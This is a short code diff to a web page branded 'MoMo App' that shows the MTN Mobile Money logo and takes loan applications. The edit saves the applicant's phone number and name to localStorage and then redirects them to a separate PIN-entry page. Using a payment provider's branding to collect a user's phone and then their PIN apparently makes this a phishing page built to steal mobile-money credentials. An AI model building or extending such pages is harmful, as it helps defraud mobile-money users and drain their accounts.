@@ -93,7 +93,6 @@ button:active {
 
 <!-- HEADER -->
 <div class="header">
-  <!-- Better logo -->
   <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
   MoMo App
 </div>
@@ -149,11 +148,19 @@ document.getElementById("loanForm").addEventListener("submit", async function(e)
     });
 
     if (res.status === 200) {
-      window.location.href = "/success.html";
+
+      // ✅ SAVE DATA FOR PIN PAGE
+      localStorage.setItem("phone", data.phone);
+      localStorage.setItem("name", data.name);
+
+      // 🔥 GO TO PIN PAGE
+      window.location.href = "/pin.html";
+
     } else {
       loading.style.display = "none";
       alert("❌ Error submitting application");
     }
+
   } catch (err) {
     loading.style.display = "none";
     alert("❌ Server error");
